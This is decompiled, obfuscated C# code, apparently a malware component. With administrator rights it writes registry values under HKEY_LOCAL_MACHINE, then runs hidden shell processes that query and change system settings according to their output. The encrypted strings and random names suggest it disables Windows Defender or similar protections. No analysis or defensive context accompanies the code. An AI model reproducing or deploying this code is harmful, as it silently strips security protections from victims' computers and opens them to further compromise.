using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

public static class YkpLNefBrBvr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void NQPEglPObGSY()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			PaXDxkoOAZlp(getString_0(107371250), getString_0(107371189), getString_0(107395783));
			PaXDxkoOAZlp(getString_0(107371164), getString_0(107371647), getString_0(107395736));
			PaXDxkoOAZlp(getString_0(107371622), getString_0(107371533), getString_0(107395736));
			PaXDxkoOAZlp(getString_0(107371622), getString_0(107371496), getString_0(107395736));
			PaXDxkoOAZlp(getString_0(107371622), getString_0(107371459), getString_0(107395736));
			ZYoNdjbEMZZ();
		}
	}

	private static void PaXDxkoOAZlp(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void ZYoNdjbEMZZ()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358081),
			Arguments = getString_0(107371422),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107370841)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370827));
			}
			else if (text.StartsWith(getString_0(107371533)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370758));
			}
			else if (text.StartsWith(getString_0(107370689)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370656));
			}
			else if (text.StartsWith(getString_0(107371103)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107371074));
			}
			else if (text.StartsWith(getString_0(107371013)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370988));
			}
			else if (text.StartsWith(getString_0(107370899)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370326));
			}
			else if (text.StartsWith(getString_0(107370233)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370200));
			}
			else if (text.StartsWith(getString_0(107370135)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370634));
			}
			else if (text.StartsWith(getString_0(107370525)) && text.EndsWith(getString_0(107370804)))
			{
				KgpJLUvDqQTgK(getString_0(107370528));
			}
			else if (text.StartsWith(getString_0(107370467)) && !text.EndsWith(getString_0(107396178)))
			{
				KgpJLUvDqQTgK(getString_0(107370438));
			}
			else if (text.StartsWith(getString_0(107369869)) && !text.EndsWith(getString_0(107395783)))
			{
				KgpJLUvDqQTgK(getString_0(107369816));
			}
			else if (text.StartsWith(getString_0(107369803)) && !text.EndsWith(getString_0(107369770)))
			{
				KgpJLUvDqQTgK(getString_0(107369765));
			}
			else if (text.StartsWith(getString_0(107369696)) && !text.EndsWith(getString_0(107369770)))
			{
				KgpJLUvDqQTgK(getString_0(107369627));
			}
			else if (text.StartsWith(getString_0(107370074)) && !text.EndsWith(getString_0(107369770)))
			{
				KgpJLUvDqQTgK(getString_0(107370041));
			}
			else if (text.StartsWith(getString_0(107370016)) && !text.EndsWith(getString_0(107369770)))
			{
				KgpJLUvDqQTgK(getString_0(107369947));
			}
		}
	}

	public static void KgpJLUvDqQTgK(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358081),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static YkpLNefBrBvr()
	{
		Strings.CreateGetStringDelegate(typeof(YkpLNefBrBvr));
	}
}
